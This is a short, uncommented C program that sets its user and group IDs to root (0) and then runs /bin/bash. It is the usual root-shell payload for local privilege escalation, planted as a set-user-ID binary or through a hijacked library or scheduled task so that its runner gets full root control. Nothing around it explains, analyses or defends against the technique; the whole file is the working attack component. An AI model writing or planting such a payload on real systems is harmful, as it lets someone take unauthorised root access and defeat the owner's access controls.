#include <unistd.h>

int main()
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
